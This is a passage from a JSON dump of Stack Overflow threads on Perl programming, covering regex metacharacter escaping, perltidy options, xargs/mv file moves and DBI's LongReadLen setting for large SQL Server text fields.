literally, and this needs to be protected from interpolation if there is extra quoting. See the end for a comment on quoting. For example</p>\n\n<pre><code>my @spec_ch = qw({ } [ ] ( ) ^ $ . | * + ? \\ ); \nmy @matched = grep { /\\$|\\?/ } @spec_ch;\nprint \"@matched\\n\";\n</code></pre>\n\n<p>Prints</p>\n\n<pre>\n$ ?\n</pre>\n\n<hr>\n\n<p><strong>Your actual example</strong>, only shortened and with <code>foreach</code> (see below for comment on <code>grep</code>).</p>\n\n<pre><code>my @patterns = ('\\?', 'brown', '\\|', 'fox');  # or  qw(\\? brown \\| fox); \nmy $string   = '? brown |';                   # or   q(? brown |);\nforeach my $patt (@patterns) {\n    my ($match) = $string =~ /($patt)/;\n    print \"$match\\n\" if $match;\n}\n</code></pre>\n\n<p>Prints</p>\n\n<pre>\n?\nbrown\n|\n</pre>\n\n<hr>\n\n<p>Your example turned around, so to use a pattern with both words and escaped characters</p>\n\n<pre><code>my $str = q(The $ quick ? brown | fox jumps over the lazy dog);\nmy $patt = qr(\\? brown \\|);  # or simply '\\? brown \\|'\nmy ($match) = $str =~ /($patt)/;\nprint \"$match\\n\" if $match;\n</code></pre>\n\n<p>Prints </p>\n\n<pre>\n? brown |\n</pre>\n\n<hr>\n\n<p><strong>The problem with your</strong> <code>grep</code> <strong>example</strong> is that it attempts to match the other way around -- variable <code>$string</code> is used as a pattern, while words from the array as strings to search for match. </p>\n\n<pre><code>grep { $_ =~ /$string/ } @array; \n# regex syntax: $text =~ /$pattern/, so above $_ is string, $string is pattern\n</code></pre>\n\n<p>So <code>$_</code> takes on values <code>The</code>, <code>$</code>, <code>quick</code> (etc) in turn, and they are searched for the pattern <code>$string</code> <em>inside</em> of them. The <code>foreach</code> example above does what you probably had in mind.</p>\n\n<hr>\n\n<p>The double quotes may pose problems since they interpolate and then you have to do additional escaping. Use single quotes and then the escaped special characters inside are carried that way into the regex, without any interpretation.</p>\n\n<p>The operators <code>qw</code> and <code>q</code> do not interpolate. See <a href=\"http://perldoc.perl.org/perlop.html#Quote-and-Quote-like-Operators\" rel=\"nofollow noreferrer\">Quote and Quote-like Operators in perlop</a>.</p>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5240420"}, "edited": false, "score": 0, "creation_date": 1466193330, "post_id": 37870747, "comment_id": 63233329, "body": "This was the answer I was searching for in searching array with regex characters. Thank you very much."}], "tags": [], "owner": {"reputation": 155387, "user_id": 978917, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/92d059913eace78a868a3e87f98e0a57?s=128&d=identicon&r=PG", "display_name": "ruakh", "link": "https://stackoverflow.com/users/978917/ruakh"}, "is_accepted": false, "score": 3, "last_activity_date": 1466118147, "creation_date": 1466118147, "answer_id": 37870747, "question_id": 37870091, "link": "https://stackoverflow.com/questions/37870091/how-to-escape-perl-regular-expression-characters-in-array-and-in-grep/37870747#37870747", "title": "How to escape Perl regular expression characters in array and in grep?", "body": "<p>The problem here is that this:</p>\n\n<pre><code>$string = \"\\? brown \\|\";\n</code></pre>\n\n<p>is just a misleading way to write this:</p>\n\n<pre><code>$string = \"? brown |\";\n</code></pre>\n\n<p>The best fix is either (option 1) not to use a string at all, but a pattern object:</p>\n\n<pre><code>$pat = qr/\\? brown \\|/;\n\n@new_array = grep(/$pat/,@array);\n</code></pre>\n\n<p>or (2) to use <code>\\Q</code> to \"quote\" any regex metacharacters in the string when you create the pattern:</p>\n\n<pre><code>$string = \"? brown |\";\n\n@new_array = grep(/\\Q$string/,@array);\n</code></pre>\n\n<p>Failing that, you can ensure that your string ends up actually containing <code>\\? brown \\|</code> (instead of just <code>? brown |</code>) by writing any of these:</p>\n\n<pre><code>$string = \"\\\\? brown \\\\|\"; # option 3\n$string = '\\? brown \\|';   # option 4\n$string = \"\\Q\\? brown \\|\"; # option 5\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5240420"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1279, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1578038279, "creation_date": 1466114572, "last_edit_date": 1578038279, "question_id": 37870091, "link": "https://stackoverflow.com/questions/37870091/how-to-escape-perl-regular-expression-characters-in-array-and-in-grep", "title": "How to escape Perl regular expression characters in array and in grep?", "body": "<p>I have two questions but also could be so easy to answer. Probably just a newbie questions. There is little about this on Google.</p>\n\n<p>First: How do you put Perl matching operators in array?\nFor example all of these characters:</p>\n\n<pre><code>{}[]()^$.|*+?\\\n</code></pre>\n\n<p>to use then with foreach?</p>\n\n<p>Second, if you have this:</p>\n\n<pre><code>@array = qw(The $ quick ? brown | fox jumps over the lazy dog);\n\n$string = \"\\? brown \\|\";\n\n@new_array = grep(/$string/,@array);\n</code></pre>\n\n<p>How to properly find $string in the @array if @array is some text for example which contains dollar sign, question mark etc.? If you search regex character it will turn into operator. And if you do this: </p>\n\n<pre><code>$string =~ s/\\$/\\$/gi; \n</code></pre>\n\n<p>it will have the same result of course.</p>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["perl", "perl-tidy"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 3, "creation_date": 1466112267, "post_id": 37869315, "comment_id": 63196046, "body": "<a href=\"http://www.perlmonks.org/?node_id=1165909\" rel=\"nofollow noreferrer\">Crossposted</a>."}, {"owner": {"reputation": 6351, "user_id": 10415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99940add21e5fb2247237459a586597d?s=128&d=identicon&r=PG", "display_name": "runrig", "link": "https://stackoverflow.com/users/10415/runrig"}, "edited": false, "score": 0, "creation_date": 1466179842, "post_id": 37869315, "comment_id": 63226647, "body": "What version? Upgrade to the latest and see if it fixes your problem. There were signature related changes and fixes in the last couple of versions."}], "answers": [{"comments": [{"owner": {"reputation": 161, "user_id": 1198451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/36465c07287bee5357cc2cd55cbad9a1?s=128&d=identicon&r=PG", "display_name": "alexbyk", "link": "https://stackoverflow.com/users/1198451/alexbyk"}, "edited": false, "score": 0, "creation_date": 1466151394, "post_id": 37872291, "comment_id": 63208240, "body": "Works. Thanks a lot."}, {"owner": {"reputation": 6351, "user_id": 10415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99940add21e5fb2247237459a586597d?s=128&d=identicon&r=PG", "display_name": "runrig", "link": "https://stackoverflow.com/users/10415/runrig"}, "edited": false, "score": 0, "creation_date": 1473868052, "post_id": 37872291, "comment_id": 66306838, "body": "I often like the linebreaks that perltidy adds. Did the OP try upgrading?"}], "tags": [], "owner": {"reputation": 1430, "user_id": 755136, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/9a0c71d0e2b67daea43f7f7346ec1456?s=128&d=identicon&r=PG", "display_name": "edibleEnergy", "link": "https://stackoverflow.com/users/755136/edibleenergy"}, "is_accepted": true, "score": 2, "last_activity_date": 1466131298, "creation_date": 1466131298, "answer_id": 37872291, "question_id": 37869315, "link": "https://stackoverflow.com/questions/37869315/perltidy-an-option-to-keep-subargs-as-a-single-line/37872291#37872291", "title": "Perltidy: an option to keep sub($args){} as a single line?", "body": "<p><code>perltidy -fnl</code> (\"If you do not want any changes to the line breaks within lines of code in your script\") seems to work, though I'm not sure how you want the rest of your code to look.</p>\n\n<p><a href=\"https://metacpan.org/pod/distribution/Perl-Tidy/bin/perltidy#Line-Break-Control\" rel=\"nofollow\">https://metacpan.org/pod/distribution/Perl-Tidy/bin/perltidy#Line-Break-Control</a></p>\n"}], "owner": {"reputation": 161, "user_id": 1198451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/36465c07287bee5357cc2cd55cbad9a1?s=128&d=identicon&r=PG", "display_name": "alexbyk", "link": "https://stackoverflow.com/users/1198451/alexbyk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "accepted_answer_id": 37872291, "answer_count": 1, "score": 2, "last_activity_date": 1466131298, "creation_date": 1466111029, "question_id": 37869315, "link": "https://stackoverflow.com/questions/37869315/perltidy-an-option-to-keep-subargs-as-a-single-line", "title": "Perltidy: an option to keep sub($args){} as a single line?", "body": "<pre><code>$fs-&gt;traverse('/foo')-&gt;filter(sub ($name, $dir) { $name !~ /^\\./; });\n$fs-&gt;traverse('/foo')-&gt;filter(sub { $_[0] !~ /^\\./; });\n</code></pre>\n\n<p>Is there any option to keep the first line as is? Because with -pbp perltidy breaks it into 5 lines because of a signatures feature.</p>\n"}, {"tags": ["regex", "bash", "perl", "pcre"], "comments": [{"owner": {"reputation": 1473, "user_id": 3841431, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d4b711dfcaa497d4fea7ca03e198b16f?s=128&d=identicon&r=PG&f=1", "display_name": "wpcarro", "link": "https://stackoverflow.com/users/3841431/wpcarro"}, "edited": false, "score": 0, "creation_date": 1466109080, "post_id": 37868808, "comment_id": 63194457, "body": "Also... I realize that my Perl and Regex pipeline could be replaced by the following: <code>$ cat downloads.txt | xargs basename</code>"}, {"owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "edited": false, "score": 0, "creation_date": 1466109622, "post_id": 37868808, "comment_id": 63194737, "body": "You could always re-download the files in the correct directory then delete the ones that were in the wrong directory (your CWD): <code>cat downloads.txt | xargs wget -P &#47;directory&#47;</code> then <code>cat downloads | xargs rm</code>"}, {"owner": {"reputation": 1932, "user_id": 2322941, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/OCqy9.jpg?s=128&g=1", "display_name": "Stefan Hegny", "link": "https://stackoverflow.com/users/2322941/stefan-hegny"}, "edited": false, "score": 1, "creation_date": 1466109670, "post_id": 37868808, "comment_id": 63194767, "body": "Do you literally mean &quot;vendor&quot;? I don&#39;t understand exactly, looks like <code>mv *.* vendor</code> could do the job? (provided all downloaded files have a dot .)"}, {"owner": {"reputation": 1473, "user_id": 3841431, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d4b711dfcaa497d4fea7ca03e198b16f?s=128&d=identicon&r=PG&f=1", "display_name": "wpcarro", "link": "https://stackoverflow.com/users/3841431/wpcarro"}, "edited": false, "score": 0, "creation_date": 1466109792, "post_id": 37868808, "comment_id": 63194835, "body": "I understand how impractical I&#39;m being, but in this particular scenario I&#39;m imagining that I have already downloaded the files using wget and that window has closed. Now I already have the files in my cwd and I&#39;d like to create a pipeline to mv them to the vendor directory. I believe the <code>replstring</code> flag for <code>xargs</code> is what I&#39;m looking for although I&#39;ve never used it before..."}, {"owner": {"reputation": 1473, "user_id": 3841431, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d4b711dfcaa497d4fea7ca03e198b16f?s=128&d=identicon&r=PG&f=1", "display_name": "wpcarro", "link": "https://stackoverflow.com/users/3841431/wpcarro"}, "reply_to_user": {"reputation": 1932, "user_id": 2322941, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/OCqy9.jpg?s=128&g=1", "display_name": "Stefan Hegny", "link": "https://stackoverflow.com/users/2322941/stefan-hegny"}, "edited": false, "score": 0, "creation_date": 1466109873, "post_id": 37868808, "comment_id": 63194880, "body": "@StefanHegny this directory already has other files and I&#39;d like to only move the files that were recently downloaded. I can target those files using <code>$ cat downloads.txt | xargs basename</code> I&#39;m missing the final piece to this pipeline that allows me to execute the mv command..."}, {"owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "edited": false, "score": 0, "creation_date": 1466109890, "post_id": 37868808, "comment_id": 63194889, "body": "@wcarroll <code>for f in $(cat downloads.txt | xargs); do mv $f &#47;new-directory&#47;$f; done</code>"}, {"owner": {"reputation": 1932, "user_id": 2322941, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/OCqy9.jpg?s=128&g=1", "display_name": "Stefan Hegny", "link": "https://stackoverflow.com/users/2322941/stefan-hegny"}, "edited": false, "score": 1, "creation_date": 1466110043, "post_id": 37868808, "comment_id": 63194980, "body": "<code>cat downloads.txt | xargs -i mv {} vendor</code>  ?"}, {"owner": {"reputation": 1473, "user_id": 3841431, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d4b711dfcaa497d4fea7ca03e198b16f?s=128&d=identicon&r=PG&f=1", "display_name": "wpcarro", "link": "https://stackoverflow.com/users/3841431/wpcarro"}, "reply_to_user": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "edited": false, "score": 0, "creation_date": 1466110148, "post_id": 37868808, "comment_id": 63195030, "body": "@HunterMcMillen this works, but I was looking for a pipeline as opposed to a script. Still helpful, however!"}, {"owner": {"reputation": 652, "user_id": 613651, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cba67334db5dcc4c729dbbd766b700d3?s=128&d=identicon&r=PG", "display_name": "Keith Tyler", "link": "https://stackoverflow.com/users/613651/keith-tyler"}, "edited": false, "score": 0, "creation_date": 1466111778, "post_id": 37868808, "comment_id": 63195834, "body": "&quot;As a side-question: Is there a useful way to print the most recently created files to STDOUT?&quot; You mean like <code>ls -t</code>? The question is what do you mean by most recently? The most recent N files, or the files created since a certain time? In the latter case you want <code>find</code>"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1466145081, "post_id": 37868808, "comment_id": 63204851, "body": "Beware <a href=\"https://stackoverflow.com/questions/11710552/useless-use-of-cat/\">UUoC</a> \u2014 Useless Use of <code>cat</code>."}], "answers": [{"tags": [], "owner": {"reputation": 3089, "user_id": 6165935, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-5SjwIcK5M8I/AAAAAAAAAAI/AAAAAAAAAFQ/xyQQHb_jXoQ/photo.jpg?sz=128", "display_name": "Michael Vehrs", "link": "https://stackoverflow.com/users/6165935/michael-vehrs"}, "is_accepted": false, "score": 0, "last_activity_date": 1466141901, "last_edit_date": 1466141901, "creation_date": 1466141528, "answer_id": 37873793, "question_id": 37868808, "link": "https://stackoverflow.com/questions/37868808/using-xargs-eval-and-mv-ensemble/37873793#37873793", "title": "Using xargs, eval, and mv ensemble", "body": "<pre><code> xargs -l -a downloads.txt basename | xargs -i mv {}  ./vendor\n</code></pre>\n\n<p>How this works: The first instance of <code>xargs</code> reads the file names from <code>downloads.txt</code> and calls <code>basename</code> for each of these file names individually (alternatively, you could use <code>basename -a</code>). These basenames are then piped to another instance of <code>xargs</code>, which uses the arguments to call <code>mv</code>, replacing the string <code>{}</code> with the current argument.</p>\n\n<pre><code>mv $(basename -a $(&lt;downloads.txt)) ./vendor\n</code></pre>\n\n<p>How this works: Since you want to move all the files into the same directory, you can use a single call to <code>mv</code>. The command substitution (\"backticks\") inserts the output of the command <code>basename -a</code>, which, in turn, reads its arguments from the file.</p>\n"}], "owner": {"reputation": 1473, "user_id": 3841431, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d4b711dfcaa497d4fea7ca03e198b16f?s=128&d=identicon&r=PG&f=1", "display_name": "wpcarro", "link": "https://stackoverflow.com/users/3841431/wpcarro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 393, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1466170903, "creation_date": 1466109003, "last_edit_date": 1466170903, "question_id": 37868808, "link": "https://stackoverflow.com/questions/37868808/using-xargs-eval-and-mv-ensemble", "title": "Using xargs, eval, and mv ensemble", "body": "<p>I've been using the command line more frequently lately to increase my proficiency. I've created a .txt file containing URLs for libraries that I'd like to download. I batch-downloaded these files using</p>\n\n<pre><code>$ cat downloads.txt | xargs wget\n</code></pre>\n\n<p>When using the wget command I didn't specify a destination directory. I'd like to move each of the files that I've just downloaded into a directory called \"vendor\". </p>\n\n<p>For the record, it has occurred to me that if I ran...</p>\n\n<pre><code>$ open .\n</code></pre>\n\n<p>...I could drag-and-drop these files into the desired directory. But in my opinion that would defeat the purpose of this exercise.</p>\n\n<p>Now that I have the files in my cwd, I'd like to be able to target them and move them into the \"vendor\" directory.</p>\n\n<p>As a side-question: Is there a useful way to print the most recently created files to STDOUT? Currently, I can grab the filenames from the URLs within downloads.txt pretty simply using the following pipeline and Perl script...</p>\n\n<pre><code>$ cat downloads.txt | perl -n -e 'if (/(?&lt;=\\/)([-.a-z]+)$/) { print $1 . \"\\n\" }'\n</code></pre>\n\n<p>This will produce... </p>\n\n<pre><code>react.js\nredux.js\nreact-dom.js\nexpect.js\n</code></pre>\n\n<p>...which is great as these are file that I intended on targeting. I'd like to transform each of these lines into a command within a pipeline that resembles this...</p>\n\n<pre><code>$ mv {./,./vendor/}&lt;filename&gt;\n</code></pre>\n\n<p>... where <code>&lt;filename&gt;</code> is \"react.js\" then \"redux.js\", and so forth.</p>\n\n<p>I figure that I may be able to accomplish this using some combination of <code>xargs</code>, <code>eval</code>, and <code>mv</code>. This is where my bash skills drop-off.</p>\n\n<p>Just to reiterate, I'm aware that the method in which I am approaching this problem is neither simple nor ideal. This is intentionally a convoluted exercise intended to stretch my bash knowledge.</p>\n\n<p>Is there anyone who knows how I can use <code>xargs</code>, <code>eval</code>, and <code>mv</code> to accomplish this goal?</p>\n\n<p>Thank you!</p>\n"}, {"tags": ["sql", "sql-server", "perl", "dbi"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1466113672, "post_id": 37867594, "comment_id": 63196593, "body": "According to the <a href=\"https://metacpan.org/pod/DBI#LongReadLen\" rel=\"nofollow noreferrer\">DBI docs</a>, &quot;Changing the value of <code>LongReadLen</code> for a statement handle after it has been <code>prepare</code>&#39;d will typically have no effect, so it&#39;s common to set <code>LongReadLen</code> on the <code>$dbh</code> before calling <code>prepare</code>.&quot; Does that fix your issue?"}, {"owner": {"reputation": 11, "user_id": 1354169, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f9815bcc03234254041bc7d89b6cc90f?s=128&d=identicon&r=PG", "display_name": "Cassie", "link": "https://stackoverflow.com/users/1354169/cassie"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466172308, "post_id": 37867594, "comment_id": 63221938, "body": "That appears to have done the trick! Thank you so much!"}], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466172700, "post_id": 37883159, "comment_id": 63222208, "body": "Nice answer. You might also want to mention that this behavior is actually documented in the <a href=\"https://metacpan.org/pod/DBI#LongReadLen\" rel=\"nofollow noreferrer\">DBI docs</a>."}, {"owner": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466174127, "post_id": 37883159, "comment_id": 63223176, "body": "I will.  I&#39;ll add that to my answer.  Thx."}], "tags": [], "owner": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "is_accepted": false, "score": 1, "last_activity_date": 1466174364, "last_edit_date": 1466174364, "creation_date": 1466170884, "answer_id": 37883159, "question_id": 37867594, "link": "https://stackoverflow.com/questions/37867594/trying-to-select-large-text-field-from-database-using-perl-dbi-and-it-only-sele/37883159#37883159", "title": "Trying to select large text field from database using Perl DBI, and it only selects the first bit", "body": "<p>I've had a similar issue with DBI::ODBC and I would change the code on the database handle, not the statement handle.  Using your code it would now look like such (noticed the <code>LongReadLen</code> has been moved up in the code and I suggest using the database handle <code>$dbh</code>, not the statement handle <code>$sth</code>):</p>\n\n<pre><code>my $dbh = DBI-&gt;connect(\"dbi:ODBC:Driver={SQL Server};Server=$server;UID=$user;PWD=$password\")\n    or die \"Can't connect to server: $DBI::errstr\";\n\n$dbh-&gt;{LongTruncOk} = 1;\n$dbh-&gt;{LongReadLen} = 2000;\n\nmy $sth = $dbh-&gt;prepare(\"select note_txt from database\")\n    or die \"Couldn't prepare statement: \" . $dbh-&gt;errstr;\nmy @data;\n\n$sth-&gt;execute()\n    or die \"Couldn't execute statement: \" . $sth-&gt;errstr;\n\nwhile (@data = $sth-&gt;fetchrow_array()) {\n    my $note = $data[0];\n    parse_note($note);\n}\n</code></pre>\n\n<p>You may also want to adjust the <code>$dbh-&gt;{'LongReadLen'} = 2000;</code> to be higher.  Each situation is, of course, different but in my case I used 16K i.e. <code>$dbh-&gt;{'LongReadLen'} = 16384;</code></p>\n\n<p>Here is also a little code stub with comments from the book <em>Programming the Perl DBI</em>:</p>\n\n<pre><code>$dbh-&gt;{LongReadLen} = 512 * 1024;  ### We are interested in the first 512 KB of data\n$dbh-&gt;{LongTruncOk} = 1;    ### We're happy to truncate any excess\n</code></pre>\n\n<p>NOTE: I also don't believe the single quotes are necessary.  So <code>$dbh-&gt;{'LongReadLen'}</code> becomes <code>$dbh-&gt;{LongReadLen}</code>.<br>\nAlso, as mentioned by the user <em>@ThisSuitIsBlackNot</em> in the comments, please refer to the <a href=\"https://metacpan.org/pod/DBI#LongReadLen\" rel=\"nofollow\">DBI docs</a> for further clarification and information.</p>\n"}], "owner": {"reputation": 11, "user_id": 1354169, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f9815bcc03234254041bc7d89b6cc90f?s=128&d=identicon&r=PG", "display_name": "Cassie", "link": "https://stackoverflow.com/users/1354169/cassie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 209, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1466174364, "creation_date": 1466104367, "question_id": 37867594, "link": "https://stackoverflow.com/questions/37867594/trying-to-select-large-text-field-from-database-using-perl-dbi-and-it-only-sele", "title": "Trying to select large text field from database using Perl DBI, and it only selects the first bit", "body": "<p>I am using Perl to parse through a large number of rich text \"files\" (stored as ntext - a datatype that is pretty much a mystery to me) which live in a SQL Server database, which I am pretty new to, having previously only worked with Oracle. However, I am only getting the first ~40 characters back from each file. Each file begins something like this:</p>\n\n<pre><code>{\\rtf1\\sste17000\\ansi\\deflang1033\\ftnbj\\uc1\\deff0 {\\fonttbl{\\f0 \\fswiss Arial;} etc.\n</code></pre>\n\n<p>But when I'm selecting from within Perl, they cut off like this:</p>\n\n<pre><code>{\\rtf1\\sste17000\\ansi\\deflang1033\\ftnbj\n</code></pre>\n\n<p>Here is the code I have right now (select statement obviously simplified for brevity):</p>\n\n<pre><code>my $dbh = DBI-&gt;connect(\"dbi:ODBC:Driver={SQL Server};Server=$server;UID=$user;PWD=$password\")\n    or die \"Can't connect to server: $DBI::errstr\";\n\nmy $sth = $dbh-&gt;prepare(\"select note_txt from database\")\n    or die \"Couldn't prepare statement: \" . $dbh-&gt;errstr;\nmy @data;\n\n$sth-&gt;execute()\n    or die \"Couldn't execute statement: \" . $sth-&gt;errstr;\n\n$sth-&gt;{'LongTruncOk'} = 1;\n$sth-&gt;{'LongReadLen'} = 2000;\nwhile (@data = $sth-&gt;fetchrow_array()) {\n    my $note = $data[0];\n    parse_note($note);\n}\n</code></pre>\n\n<p>Why is it only giving me the first ~40 characters, and how can I get out the entire text?</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["arrays", "perl", "ref"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 5, "creation_date": 1466103352, "post_id": 37867153, "comment_id": 63191468, "body": "Looks good from here. Are you sure that <code>@values</code> is not an empty list?"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 4, "last_activity_date": 1466108067, "creation_date": 1466108067, "answer_id": 37868603, "question_id": 37867153, "link": "https://stackoverflow.com/questions/37867153/perl-unable-to-construct-array-of-objects/37868603#37868603", "title": "Perl -- unable to construct array of objects", "body": "<p>Assuming <code>my $objList = [$object];</code> is a typo for <code>my $objList = [$obj];</code>, and assuming, <code>my @values = 'HELLO';</code>, there are no differences.</p>\n\n<p>Assuming you meant \"<code>@$objList</code> is still empty\" when you said \"<code>$objList</code> is still empty\", that can only happen if the loop isn't entered (i.e. <code>@values</code> is empty).</p>\n"}], "owner": {"reputation": 5051, "user_id": 759051, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/51bbf006002450d264a53bf1afc428a6?s=128&d=identicon&r=PG", "display_name": "Jeremy", "link": "https://stackoverflow.com/users/759051/jeremy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "accepted_answer_id": 37868603, "answer_count": 1, "score": 0, "last_activity_date": 1466108067, "creation_date": 1466102901, "question_id": 37867153, "link": "https://stackoverflow.com/questions/37867153/perl-unable-to-construct-array-of-objects", "title": "Perl -- unable to construct array of objects", "body": "<p>I've tried two similar bits of syntax. This first one works:</p>\n\n<pre><code>   my $obj = PI::something::ObjectManipulator-&gt;new();\n   $obj-&gt;setValue('HELLO');\n   my $objList = [$object];\n</code></pre>\n\n<p>This, however, doesn't:</p>\n\n<pre><code>  my $objList= [];\n  foreach my $value (@values) {\n    my $obj = PI::something::ObjectManipulator-&gt;new();\n    $obj-&gt;setValue($value);\n    push @$objList, $obj;\n  };\n</code></pre>\n\n<p>What is the difference between these two way of doing things? Why doesn't the second work? (By not work, it seems to be that $objList is still empty at the end of the code.)</p>\n"}, {"tags": ["perl", "dancer"], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466109993, "post_id": 37868813, "comment_id": 63194956, "body": "<a href=\"https://metacpan.org/pod/Dancer2::Plugin::SendAs\" rel=\"nofollow noreferrer\">Dancer2::Plugin::SendAs</a> allows you to override the default all-or-nothing serializer behavior, but it&#39;s not necessary here, and I think things are cleaner when you do stick to one serializer for all routes in an app."}, {"owner": {"reputation": 349, "user_id": 2773127, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6fef172929e808d472f63d56950a4b62?s=128&d=identicon&r=PG&f=1", "display_name": "Peter Staab", "link": "https://stackoverflow.com/users/2773127/peter-staab"}, "edited": false, "score": 0, "creation_date": 1466181565, "post_id": 37868813, "comment_id": 63227550, "body": "I got this to work in the test case and am applying it to mine.  I wanted to add that to get a test script to get this to work, you need to make sure that you save cookies and the resend as shown in <a href=\"https://metacpan.org/pod/distribution/Dancer2/lib/Dancer2/Manual/Testing.pod#Cookies\" rel=\"nofollow noreferrer\">the Dancer doc on testing with cookies</a>"}], "tags": [], "owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "is_accepted": true, "score": 0, "last_activity_date": 1466109033, "creation_date": 1466109033, 